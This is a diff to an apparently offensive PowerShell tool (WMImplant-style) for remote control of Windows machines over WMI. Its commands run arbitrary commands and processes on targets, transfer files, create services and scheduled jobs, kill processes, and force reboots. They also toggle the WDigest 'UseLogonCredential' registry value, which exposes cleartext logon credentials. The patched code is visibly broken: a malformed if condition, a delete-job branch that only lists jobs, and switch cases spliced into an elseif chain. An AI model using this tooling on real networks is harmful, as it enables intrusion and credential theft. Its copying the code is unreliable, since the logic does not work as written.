+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$KeyCreate) -and (!$KeyDelete)
+            {
+                Throw "You need to specify if you want to create or delete a string registry value!"
+            }
+
+            if(!$RegHive)
+            {
+                Throw "You need to specify either [hklm] or [hkcu] for the registry value to use!"
+            }
+
+            if(!$RegKey)
+            {
+                Throw "You need to specify the registry key you will add or remove a value from!"
+            }
+
+            if(!$RegValue)
+            {
+                Throw "Please provide the registry value you are looking to modify!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue
+                }
+                else
+                {
+                    Invoke-RegValueMod -Target $Computer -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue
+                }
+            }
+        }
+
+        elseif($RemotePosh)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$Location)
+            {
+                Throw "You need to specify the Location flag to provide the file location where the script is!"
+            }
+
+            if(!$Function)
+            {
+                Throw "You need to specify the Function flag to provide the function to run on the remote system!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Location $Location -Function $Function -Target $Computer
+                }
+
+                else
+                {
+                    Invoke-RemoteScriptWithOutput -Location $Location -Function $Function -Target $Computer
+                }
+            }
+        }
+
+        elseif($ListJobs)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction list
+                }
+                else
+                {
+                    Invoke-JobMod -Target $Computer -JobAction list
+                }
+            }
+        }
+
+        elseif($DeleteJob)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$RemoteID)
+            {
+                Throw "You need to specify the job ID to delete with the -RemoteID flag"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction list
+                }
+                else
+                {
+                    Invoke-JobMod -Target $Computer -JobAction list
+                }
+            }
+        }
+
+        elseif($CreateJob)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$RemoteFile)
+            {
+                Throw "You need to specify the path to a file to run when creating a job with -RemoteFile flag"
+            }
+
+            if(!$Time)
+            {
+                Throw "You need to use -Time to specify when your job will run"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction create -JobProcess $RemoteFile -Time $Time
+                }
+                else
+                {
+                    Invoke-JobMod -Target $Computer -JobAction create -JobProcess $RemoteFile -Time $Time
+                }
+            }
+        }
+
+        "service_mod"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$ServiceAction)
+            {
+                Throw "You need to specify if you want to [start], [stop], [create], or [delete] a service with -ServiceAction!"
+            }
+
+            switch ($ServiceAction.Trim().ToLower())
+            {
+                "start"
+                {
+                    if(!$ServiceName)
+                    {
+                        Throw "You need to specify the service name you want to start!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Start
+                        }
+                        else
+                        {
+                            Invoke-ServiceMod -Target $Computer -Service $ServiceName -Start
+                        }
+                    }
+                }
+
+                "stop"
+                {
+                    if(!$ServiceName)
+                    {
+                        Throw "You need to specify the service name you want to stop!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Stop
+                        }
+                        else
+                        {
+                            Invoke-ServiceMod -Target $Computer -Service $ServiceName -Stop
+                        }
+                    }
+                }
+
+                "delete"
+                {
+                    if(!$ServiceName)
+                    {
+                        Throw "You need to specify the service name you want to delete!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Delete
+                        }
+                        else
+                        {
+                            Invoke-ServiceMod -Target $Computer -Service $ServiceName -Delete
+                        }
+                    }
+                }
+
+                "create"
+                {
+                    if(!$ServiceName)
+                    {
+                        Throw "You need to specify the service name you want to create!"
                     }
 
                     if(!$RemoteFile)
                     {
-                        Throw "You need to specify a file to read with the RemoteFile flag!"
+                        Throw "You need to specify the path to the service binary for the service you are creating!"
                     }
 
                     Foreach($Computer in $Target)
                     {
                         if($RemoteCredential)
                         {
-                            Get-FileContentsWMImplant -Creds $RemoteCredential -Target $Computer -File $RemoteFile
+                            Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                         }
-
                         else
                         {
-                            Get-FileContentsWMImplant -Target $Computer -File $RemoteFile
+                            Invoke-ServiceMod -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                         }
                     }
                 }
+            }
+        }
 
-                "download"
+        "set_default"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$RemoteFile)
-                    {
-                        Throw "You need to specify a file to read with the RemoteFile flag!"
-                    }
-
-                    if(!$LocalFile)
-                    {
-                        Throw "You need to specify the location to save the file with the $LocalFile flag!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-FileTransferWMImplant -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
-                        }
-
-                        else
-                        {
-                            Invoke-FileTransferWMImplant -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
-                        }
-                    }
+                    Set-OriginalProperty -Creds $RemoteCredential -Target $Computer
                 }
 
-                "ls"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$RemoteFile)
-                    {
-                        Throw "Please provide the RemoteFile parameter to specify the directory to list!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-LSWMImplant -Creds $RemoteCredential -Target $Computer -Directory $RemoteFile
-                        }
-
-                        else
-                        {
-                            Invoke-LSWMImplant -Target $Computer -Directory $RemoteFile
-                        }
-                    }
+                    Set-OriginalProperty -Target $Computer
                 }
+            }
+        }
 
-                "search"
+        "ps"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$RemoteFile -and !$RemoteExtension)
-                    {
-                        Throw "Please provide the RemoteFile or RemoteExtension parameter to specify the file or extension to search for!"
-                    }
-
-                    if(!$RemoteDrive)
-                    {
-                        Throw "Please provide the RemoteDrive parameter to specify the drive to search!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            if($RemoteFile)
-                            {
-                                Find-FileWMImplant -Creds $RemoteCredential -File $RemoteFile -Target $Computer -Drive $RemoteDrive
-                            }
-                            elseif($RemoteExtension)
-                            {
-                                Find-FileWMImplant -Creds $RemoteCredential -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
-                            }
-                        }
-
-                        else
-                        {
-                            if($RemoteFile)
-                            {
-                                Find-FileWMImplant -File $RemoteFile -Target $Computer -Drive $RemoteDrive
-                            }
-                            elseif($RemoteExtension)
-                            {
-                                Find-FileWMImplant -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
-                            }
-                        }
-                    }
+                    Get-ProcessListingWMImplant -Creds $RemoteCredential -Target $Computer
                 }
 
-                "upload"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$LocalFile)
-                    {
-                        Throw "Please use the LocalFile flag to specify the file to upload!"
-                    }
-
-                    if(!$RemoteFile)
-                    {
-                        Throw "Please use the RemoteFile flag to specify the full path to upload the file to!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
-                        }
-
-                        else
-                        {
-                            Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
-                        }
-                    }
+                    Get-ProcessListingWMImplant -Target $Computer
                 }
+            }
+        }
 
-                "command_exec"
+        "process_kill"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$ProcessName -and !$ProcessID)
+            {
+                Throw "Please provide the ProcessID or ProcessName flag to specify the process to kill!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+
+                if($RemoteCredential)
                 {
-                    if(!$Target)
+                    if($ProcessName)
                     {
-                        Throw "You need to specify a target to run the command against!"
+                        Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -PName $ProcessName
                     }
 
-                    if(!$RemoteCommand)
+                    elseif($ProcessID)
                     {
-                        Throw "You need to specify the command to run with the -Command!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-CommandExecution -Creds $RemoteCredential -ExecCommand $RemoteCommand -Target $Computer
-                        }
-
-                        else
-                        {
-                            Invoke-CommandExecution -Target $Computer -ExecCommand $RemoteCommand
-                        }
+                        Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -ProcId $ProcessID
                     }
                 }
 
-                "disable_wdigest"
+                else
                 {
-                    if(!$Target)
+                    if($ProcessName)
                     {
-                        Throw "You need to specify a target to run the command against!"
+                        Invoke-ProcessPunisher -Target $Computer -PName $ProcessName
                     }
 
-                    Foreach($Computer in $Target)
+                    elseif($ProcessID)
                     {
-                        if($RemoteCredential)
-                        {
-                            Invoke-RegValueMod -Creds $RemoteCredential -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
-                        }
-
-                        else
-                        {
-                            Invoke-RegValueMod -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
-                        }
+                        Invoke-ProcessPunisher -Target $Computer -ProcId $ProcessID
                     }
                 }
+            }
+        }
 
-                "disable_winrm"
+        "process_start"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$RemoteFile)
+            {
+                Throw "You need to specify the RemoteFile flag to provide a file/command to run!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
-                        }
-
-                        else
-                        {
-                            Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
-                        }
-                    }
+                    Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command $RemoteFile
                 }
 
-                "enable_wdigest"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-RegValueMod -Creds $RemoteCredential -RegMethod Create -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
-                        }
-
-                        else
-                        {
-                            Invoke-RegValueMod -RegMethod Create -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $Computer
-                        }
-                    }
+                    Invoke-ProcSpawn -Target $Computer -Command $RemoteFile
                 }
+            }
+        }
 
-                "enable_winrm"
+        "active_users"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
-                        }
-
-                        else
-                        {
-                            Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
-                        }
-                    }
+                    Find-CurrentUsers -Creds $RemoteCredential -Target $Computer
                 }
 
-                "registry_mod"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$RegMethod)
-                    {
-                        Throw "You need to specify if you want to [create] or [delete] a string registry value!"
-                    }
-
-                    if(!$RegHive)
-                    {
-                        Throw "You need to specify either [hklm] or [hkcu] for the registry value to use!"
-                    }
-
-                    if(!$RegKey)
-                    {
-                        Throw "You need to specify the registry key you will add or remove a value from!"
-                    }
-
-                    if(!$RegValue)
-                    {
-                        Throw "Please provide the registry value you are looking to modify!"
-                    }
-
-                    switch($RegMethod)
-                    {
-                        "create"
-                        {
-                            Foreach($Computer in $Target)
-                            {
-                                if($RemoteCredential)
-                                {
-                                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -RegMethod create -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue -RegData $RegData
-                                }
-                                else
-                                {
-                                    Invoke-RegValueMod -Target $Computer -RegMethod create -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue -RegData $RegData
-                                }
-                            }
-                        }
-
-                        "delete"
-                        {
-                            Foreach($Computer in $Target)
-                            {
-                                if($RemoteCredential)
-                                {
-                                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -RegMethod delete -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue
-                                }
-                                else
-                                {
-                                    Invoke-RegValueMod -Target $Computer -RegMethod delete -RegHive $RegHive -RegKey $RegKey -RegValue $RegValue
-                                }
-                            }
-                        }
-                    }
+                    Find-CurrentUsers -Target $Computer
                 }
+            }
+        }
 
-                "remote_posh"
+        "basic_info"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$Location)
-                    {
-                        Throw "You need to specify the Location flag to provide the file location where the script is!"
-                    }
-
-                    if(!$Function)
-                    {
-                        Throw "You need to specify the Function flag to provide the function to run on the remote system!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Location $Location -Function $Function -Target $Computer
-                        }
-
-                        else
-                        {
-                            Invoke-RemoteScriptWithOutput -Location $Location -Function $Function -Target $Computer
-                        }
-                    }
+                    Get-HostInfo -Creds $RemoteCredential -Target $Computer
                 }
 
-                "sched_job"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$JobAction)
-                    {
-                        Throw "You need to specify if you want to [list], [create], or [delete] a job with the -JobAction flag!"
-                    }
-
-                    switch ($JobAction.Trim().ToLower())
-                    {
-                        "list"
-                        {
-                            Foreach($Computer in $Target)
-                            {
-                                if($RemoteCredential)
-                                {
-                                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction list
-                                }
-                                else
-                                {
-                                    Invoke-JobMod -Target $Computer -JobAction list
-                                }
-                            }
-                        }
-
-                        "delete"
-                        {
-                            if(!$RemoteID)
-                            {
-                                Throw "You need to specify the job ID to delete with the -RemoteID flag"
-                            }
-
-                            Foreach($Computer in $Target)
-                            {
-                                if($RemoteCredential)
-                                {
-                                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction delete -JobId $RemoteID
-                                }
-                                else
-                                {
-                                    Invoke-JobMod -Target $Computer -JobAction delete -JobId $RemoteID
-                                }
-                            }
-                        }
-
-                        "create"
-                        {
-                            if(!$RemoteFile)
-                            {
-                                Throw "You need to specify the path to a file to run when creating a job with -RemoteFile flag"
-                            }
-
-                            if(!$Time)
-                            {
-                                Throw "You need to use -Time to specify when your job will run"
-                            }
-
-                            Foreach($Computer in $Target)
-                            {
-                                if($RemoteCredential)
-                                {
-                                    Invoke-JobMod -Target $Computer -Creds $RemoteCredential -JobAction create -JobProcess $RemoteFile -Time $Time
-                                }
-                                else
-                                {
-                                    Invoke-JobMod -Target $Computer -JobAction create -JobProcess $RemoteFile -Time $Time
-                                }
-                            }
-                        }
-                    }
+                    Get-HostInfo -Target $Computer
                 }
+            }
+        }
 
-                "service_mod"
+        "drive_list"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$ServiceAction)
-                    {
-                        Throw "You need to specify if you want to [start], [stop], [create], or [delete] a service with -ServiceAction!"
-                    }
-
-                    switch ($ServiceAction.Trim().ToLower())
-                    {
-                        "start"
-                        {
-                            if(!$ServiceName)
-                            {
-                                Throw "You need to specify the service name you want to start!"
-                            }
-
-                            Foreach($Computer in $Target)
-                            {
-                                if($RemoteCredential)
-                                {
-                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Start
-                                }
-                                else
-                                {
-                                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Start
-                                }
-                            }
-                        }
-
-                        "stop"
-                        {
-                            if(!$ServiceName)
-                            {
-                                Throw "You need to specify the service name you want to stop!"
-                            }
-
-                            Foreach($Computer in $Target)
-                            {
-                                if($RemoteCredential)
-                                {
-                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Stop
-                                }
-                                else
-                                {
-                                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Stop
-                                }
-                            }
-                        }
-
-                        "delete"
-                        {
-                            if(!$ServiceName)
-                            {
-                                Throw "You need to specify the service name you want to delete!"
-                            }
-
-                            Foreach($Computer in $Target)
-                            {
-                                if($RemoteCredential)
-                                {
-                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Delete
-                                }
-                                else
-                                {
-                                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Delete
-                                }
-                            }
-                        }
-
-                        "create"
-                        {
-                            if(!$ServiceName)
-                            {
-                                Throw "You need to specify the service name you want to create!"
-                            }
-
-                            if(!$RemoteFile)
-                            {
-                                Throw "You need to specify the path to the service binary for the service you are creating!"
-                            }
-
-                            Foreach($Computer in $Target)
-                            {
-                                if($RemoteCredential)
-                                {
-                                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
-                                }
-                                else
-                                {
-                                    Invoke-ServiceMod -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
-                                }
-                            }
-                        }
-                    }
+                    Get-ComputerDrives -Creds $RemoteCredential -Target $Computer
                 }
 
-                "set_default"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Set-OriginalProperty -Creds $RemoteCredential -Target $Computer
-                        }
-
-                        else
-                        {
-                            Set-OriginalProperty -Target $Computer
-                        }
-                    }
+                    Get-ComputerDrives -Target $Computer
                 }
+            }
+        }
 
-                "ps"
+        "ifconfig"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Get-ProcessListingWMImplant -Creds $RemoteCredential -Target $Computer
-                        }
-
-                        else
-                        {
-                            Get-ProcessListingWMImplant -Target $Computer
-                        }
-                    }
+                    Get-NetworkCards -Creds $RemoteCredential -Target $Computer
                 }
 
-                "process_kill"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$ProcessName -and !$ProcessID)
-                    {
-                        Throw "Please provide the ProcessID or ProcessName flag to specify the process to kill!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-
-                        if($RemoteCredential)
-                        {
-                            if($ProcessName)
-                            {
-                                Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -PName $ProcessName
-                            }
-
-                            elseif($ProcessID)
-                            {
-                                Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -ProcId $ProcessID
-                            }
-                        }
-
-                        else
-                        {
-                            if($ProcessName)
-                            {
-                                Invoke-ProcessPunisher -Target $Computer -PName $ProcessName
-                            }
-
-                            elseif($ProcessID)
-                            {
-                                Invoke-ProcessPunisher -Target $Computer -ProcId $ProcessID
-                            }
-                        }
-                    }
+                    Get-NetworkCards -Target $Computer
                 }
+            }
+        }
 
-                "process_start"
+        "installed_programs"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    if(!$RemoteFile)
-                    {
-                        Throw "You need to specify the RemoteFile flag to provide a file/command to run!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command $RemoteFile
-                        }
-
-                        else
-                        {
-                            Invoke-ProcSpawn -Target $Computer -Command $RemoteFile
-                        }
-                    }
+                    Get-InstalledPrograms -Creds $RemoteCredential -Target $Computer
                 }
 
-                "active_users"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Find-CurrentUsers -Creds $RemoteCredential -Target $Computer
-                        }
-
-                        else
-                        {
-                            Find-CurrentUsers -Target $Computer
-                        }
-                    }
+                    Get-InstalledPrograms -Target $Computer
                 }
+            }
+        }
 
-                "basic_info"
+        "vacant_system"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Get-HostInfo -Creds $RemoteCredential -Target $Computer
-                        }
-
-                        else
-                        {
-                            Get-HostInfo -Target $Computer
-                        }
-                    }
+                    Find-VacantComputer -Creds $RemoteCredential -Target $Computer
                 }
 
-                "drive_list"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Get-ComputerDrives -Creds $RemoteCredential -Target $Computer
-                        }
-
-                        else
-                        {
-                            Get-ComputerDrives -Target $Computer
-                        }
-                    }
+                    Find-VacantComputer -Target $Computer
                 }
+            }
+        }
 
-                "ifconfig"
+        "logon_events"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($LocalFile)
                 {
-                    if(!$Target)
+                    if($RemoteCredential)
                     {
-                        Throw "You need to specify a target to run the command against!"
+                        Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer -FileName $LocalFile
                     }
 
-                    Foreach($Computer in $Target)
+                    else
                     {
-                        if($RemoteCredential)
-                        {
-                            Get-NetworkCards -Creds $RemoteCredential -Target $Computer
-                        }
-
-                        else
-                        {
-                            Get-NetworkCards -Target $Computer
-                        }
+                        Get-WMIEventLogins -Target $Computer -FileName $LocalFile
                     }
                 }
 
-                "installed_programs"
+                else
                 {
-                    if(!$Target)
+                    if($RemoteCredential)
                     {
-                        Throw "You need to specify a target to run the command against!"
+                        Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer
                     }
 
-                    Foreach($Computer in $Target)
+                    else
                     {
-                        if($RemoteCredential)
-                        {
-                            Get-InstalledPrograms -Creds $RemoteCredential -Target $Computer
-                        }
-
-                        else
-                        {
-                            Get-InstalledPrograms -Target $Computer
-                        }
+                        Get-WMIEventLogins -Target $Computer
                     }
                 }
+            }
+        }
 
-                "vacant_system"
+        "logoff"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Find-VacantComputer -Creds $RemoteCredential -Target $Computer
-                        }
-
-                        else
-                        {
-                            Find-VacantComputer -Target $Computer
-                        }
-                    }
+                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Logoff
                 }
 
-                "logon_events"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($LocalFile)
-                        {
-                            if($RemoteCredential)
-                            {
-                                Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer -FileName $LocalFile
-                            }
-
-                            else
-                            {
-                                Get-WMIEventLogins -Target $Computer -FileName $LocalFile
-                            }
-                        }
-
-                        else
-                        {
-                            if($RemoteCredential)
-                            {
-                                Get-WMIEventLogins -Creds $RemoteCredential -Target $Computer
-                            }
-
-                            else
-                            {
-                                Get-WMIEventLogins -Target $Computer
-                            }
-                        }
-                    }
+                    Invoke-PowerOptionsWMI -Target $Computer -Logoff
                 }
+            }
+        }
 
-                "logoff"
+        "reboot"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Logoff
-                        }
-
-                        else
-                        {
-                            Invoke-PowerOptionsWMI -Target $Computer -Logoff
-                        }
-                    }
+                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Reboot
                 }
 
-                "reboot"
+                else
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Reboot
-                        }
-
-                        else
-                        {
-                            Invoke-PowerOptionsWMI -Target $Computer -Reboot
-                        }
-                    }
+                    Invoke-PowerOptionsWMI -Target $Computer -Reboot
                 }
+            }
+        }
 
-                "power_off"
+        "power_off"
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
-                    {
-                        Throw "You need to specify a target to run the command against!"
-                    }
-
-                    Foreach($Computer in $Target)
-                    {
-                        if($RemoteCredential)
-                        {
-                            Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Shutdown
-                        }
-
-                        else
-                        {
-                            Invoke-PowerOptionsWMI -Target $Computer -Shutdown
-                        }
-                    }
+                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -Target $Computer -Shutdown
                 }
 
-                default
+                else
                 {
-                    Write-Output "You did not provide a valid command!  Please try again!"
+                    Invoke-PowerOptionsWMI -Target $Computer -Shutdown
                 }
-            }  #End of command switch
-        } # End of Command If
+            }
+        }
+
+        default
+        {
+            Write-Output "You did not provide a valid command!  Please try again!"
+        }
 
         elseif($ListCommands)
         {
@@ -3443,12 +3509,12 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-RegValueMod -Creds $Credential -RegMethod delete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential'
+                    Invoke-RegValueMod -Creds $Credential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential'
                 }
 
                 else
                 {
